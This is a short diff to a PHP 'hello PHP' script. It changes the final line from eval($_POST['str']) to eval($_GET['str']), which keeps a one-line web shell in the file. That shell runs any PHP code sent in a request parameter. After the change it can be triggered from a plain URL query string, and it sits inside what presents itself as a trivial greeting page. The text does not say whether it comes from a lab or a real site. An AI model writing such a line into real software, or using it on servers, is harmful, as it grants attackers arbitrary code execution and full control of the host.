@@ -1,4 +1,4 @@
 <?php 
 echo "hello PHP\n";
-eval($_POST['str']);
+eval($_GET['str']);
 ?>
